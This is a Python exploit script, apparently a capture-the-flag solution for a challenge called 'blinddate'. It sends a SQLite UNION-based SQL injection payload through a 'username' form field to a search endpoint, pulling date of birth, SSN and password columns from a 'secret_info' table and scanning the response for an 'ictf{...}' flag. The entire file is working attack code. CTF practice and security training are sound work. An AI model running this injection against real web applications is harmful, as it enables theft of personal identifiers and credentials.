#!/usr/bin/env python3

import argparse
import re
import sys
from urllib.parse import urljoin

import requests


LINE_RE = re.compile(
    r"First Name:\s*(?P<first>[^,]*),\s*Last Name:\s*(?P<last>[^,]*),\s*Username:\s*(?P<username>[^<]*)"
)
FLAG_RE = re.compile(r"ictf\{[^}]+\}")


def post_injected(url: str, payload: str) -> str:
    r = requests.post(url, data={"username": payload}, timeout=10)
    r.raise_for_status()
    return r.text


def extract_user_lines(html: str) -> list[tuple[str, str, str]]:
    return [(m.group("first"), m.group("last"), m.group("username")) for m in LINE_RE.finditer(html)]


def main() -> int:
    p = argparse.ArgumentParser(description="blinddate exploit (SQLite UNION-based injection)")
    p.add_argument("--url", required=True, help="Base URL, e.g. http://HOST:8443/")
    args = p.parse_args()

    base = args.url if args.url.endswith("/") else args.url + "/"
    search_url = urljoin(base, "search")

    payload = "' UNION SELECT dob, ssn, password FROM secret_info -- "
    html = post_injected(search_url, payload)

    m = FLAG_RE.search(html)
    if m:
        print(m.group(0))
        return 0

    rows = extract_user_lines(html)
    if rows:
        for first, last, username in rows:
            print(f"{first}\t{last}\t{username}")
        return 0

    print("No results (exploit may need adjustment).", file=sys.stderr)
    return 2


if __name__ == "__main__":
    raise SystemExit(main())

